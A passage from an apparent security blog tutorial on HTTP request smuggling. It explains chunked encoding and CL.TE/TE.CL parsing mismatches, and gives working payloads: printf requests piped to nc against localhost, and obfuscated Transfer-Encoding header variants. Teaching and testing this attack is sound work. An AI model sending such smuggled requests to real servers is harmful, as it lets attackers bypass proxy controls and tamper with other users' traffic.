in\r\n\r\nchunks.\r\n</span><br><span class="line"><span class="hljs-attribute">0\r\n</span></span><br><span class="line"><span class="hljs-attribute">\r\n</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>Here is a brief explanation. *<em>We use <code>\r\n</code> for CRLF, so<code>\r\n</code> is two bytes *</em>; the first number 4 indicates that there will be 4 bytes data next, which is the 4 letters of Wiki, and according to the RFC document standard, the letter Wiki part needs to be followed by <code>\r\n</code> to indicate the chunk-data part, and the number 4 needs to be followed by<code>\r\n</code> to indicate the chunk -size part, and the number is a hexadecimal number, such as the third data.</p><p></p><figure class="highlight taggerscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br><span class="line">in<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>chunks.<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>Here the first space exists, the <code>\r\n</code> in the data counts two characters, and the last<code>\r\n</code> indicates the end of the data. In this case, the first space is 1 byte + in 2 bytes letter + 2 <code>\r\n</code> counts 4 bytes + ‘chunks.’ 7 bytes letter = 14 bytes, 14 is ‘e’ in hexadecimal.</p><p>The last <code>0\r\n\r\n</code> indicates the end of the chunk section.</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>In itself, these things are not harmful, they are used to increase the network transmission rate in various ways, but in some special cases, some corresponding security problems will occur.</p><blockquote><p>​    In order to improve the user’s browsing speed, improve the user experience, and reduce the burden on the server, many websites use the CDN acceleration service. The simplest acceleration service is to add a reverse proxy server with caching function in front of the source station. When the user requests some static resources, it can be obtained directly from the proxy server without having to obtain it from the source server. This has a very typical topology.</p></blockquote><p>Here is a picture from @mengchen :</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520133872.png" alt=""></p><p>Generally speaking, the reverse proxy and back-end server will not use pipeline technology, or even keep-alive. The measures taken by the reverse proxy is to reuse the TCP connection, because compare with the reverse proxy and back-end server, the reverse proxy server and the back-end server IP are relatively fixed, and requests from different users establish a link with the back-end server through the proxy server, and the TCP link between the two is reused.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520139456.png" alt=""></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520130675.png" alt=""></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520134020.png" alt=""></p><blockquote><p>​    When we send a fuzzy HTTP request to the proxy server, because the implementation of the two servers is different, the proxy server may consider this to be a HTTP request and then forward it to the source server of the back-end. However, after the source server is parsed, only part of it is a normal request, and the remaining part is a smuggling request. When the part affects the normal user’s request, the HTTP smuggling attack is implemented.</p></blockquote><p>The HTTP Smuggling attack is based on the inconsistency between the reverse proxy and the backend server in parsing and processing HTTP requests. Using this difference, we can embed another HTTP request in order to achieve our purpose of “smuggling” the request. It directly shows that we can access intranet services or cause some other attacks.</p><h2 id="Attack-Method"><a href="#Attack-Method" class="headerlink" title="Attack Method"></a>Attack Method</h2><p>Since it is based on analytical differences, what analytical differences will we have? The scenario is the scenario above, but we simplify it and fix the back-end server to one, there is no certain probability. In other words, the architecture is similar to the following diagram:</p><p></p><figure class="highlight gherkin hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User            Front           Backend</span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|</span><br><span class="line">|<span class="hljs-string">------A-------&gt;</span>|<span class="hljs-string">               </span>|<span class="hljs-string"> </span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">-------A------&gt;</span>|<span class="hljs-string"> </span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;-A(200)-------</span>|</span><br><span class="line">|<span class="hljs-string">&lt;-A(200)-------</span>|<span class="hljs-string">               </span>|</span><br></pre></td></tr></tbody></table></figure><p></p><p>We know that both Content-Length and Transfer-Encoding can be used as a way to process the body during POST data transmission. In order to facilitate reading and writing, we have the following shorthand rules for field processing priority rules:</p><ul><li>CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.</li><li>TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.</li></ul><p>And Front represents a typical front-end server such as a reverse proxy, and Backend represents a back-end business server that processes requests. In the following, <code>\r\n</code> is used instead of CRLF, and the length is two bytes.</p><h3 id="Chunks-Priority-On-Content-Length"><a href="#Chunks-Priority-On-Content-Length" class="headerlink" title="Chunks Priority On Content-Length"></a>Chunks Priority On Content-Length</h3><p>Some may see that this will have the same confusion as me. Is the RFC document not standardized for CL &amp; TE parsing priorities? Yes, we can read  <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank" rel="noopener">RFC 7230 Message Body Length</a>:</p><blockquote><p>​    If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length.  Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting  (Section 9.4) and ought to be handled as an error.  A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.</p></blockquote><p>Although it is pointed out that TL takes precedence over CL, we can still bypass it in some ways, or that the middleware is not implemented in accordance with this RFC standard specification, which leads to differences.</p><p>For example, we use the following code to send an HTTP request:</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">'GET / HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host:localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Content-length:56\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Transfer-Encoding: chunked\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Dummy:Header\r\n\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'0\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'GET /tmp HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host:localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Dummy:Header\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'GET /tests HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host:localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Dummy:Header\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line">| nc -q3 127.0.0.1 8080</span><br></pre></td></tr></tbody></table></figure><p></p><p>The above correct resolution should be resolved into three requests:</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host:localhost</span></span><br><span class="line"><span class="hljs-attribute">Content-length:56</span></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="hljs-attribute">Dummy:Header</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/tmp</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host:localhost</span></span><br><span class="line"><span class="hljs-attribute">Dummy:Header</span></span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/tests</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host:localhost</span></span><br><span class="line"><span class="hljs-attribute">Dummy:Header</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>If there is a TE &amp; CL priority problem, it will be parsed into two requests:</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1[CRLF]</span><br><span class="line"><span class="hljs-attribute">Host:localhost[CRLF]</span></span><br><span class="line"><span class="hljs-attribute">Content-length:56[CRLF]</span></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked[CRLF] (ignored and removed, hopefully)</span><br><span class="line"><span class="hljs-attribute">Dummy:Header[CRLF]</span></span><br><span class="line"><span class="hljs-attribute">[CRLF]</span></span><br><span class="line">0[CRLF]  (start of 56 bytes of body)</span><br><span class="line">[CRLF]</span><br><span class="line">GET /tmp HTTP/1.1[CRLF]</span><br><span class="line"><span class="hljs-attribute">Host:localhost[CRLF]</span></span><br><span class="line">Dummy:Header[CRLF] (end of 56 bytes of body, not parsed)</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/tests</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host:localhost</span></span><br><span class="line"><span class="hljs-attribute">Dummy:Header</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Bad-Chunked-Transmission"><a href="#Bad-Chunked-Transmission" class="headerlink" title="Bad Chunked Transmission"></a>Bad Chunked Transmission</h3><p>According to <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank" rel="noopener">RFC7230 section 3.3.3</a> ：</p><blockquote><p>If a Transfer-Encoding header field is present in a request and the chunked transfer coding is not the final encoding, the message body length cannot be determined reliably; the server MUST respond with the 400 (Bad Request) status code and then close the connection.</p></blockquote><p>When receiving <code>Transfer-Encoding: chunked, zorg</code>, it should return a 400 error.</p><p>We have a lot payloads to bypass it. Such as:</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: x</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding:[tab]chunked</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line"> Transfer-Encoding: chunked</span><br><span class="line"><span class="hljs-attribute">X</span>: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span></span><br><span class="line"> : chunked</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Null-In-Headers"><a href="#Null-In-Headers" class="headerlink" title="Null In Headers"></a>Null In Headers</h3><p>This problem is more likely to occur in some middleware servers written in C language, because <code>\0</code> stands for the end of string character in C language. When used in the header, if we use<code>\0</code>, some middleware may appear abnormal Parsing.</p><p>Such as:</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)</span></span><br><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">'GET / HTTP/1.1\r\n'</span>\</span><br><span class="line"><span 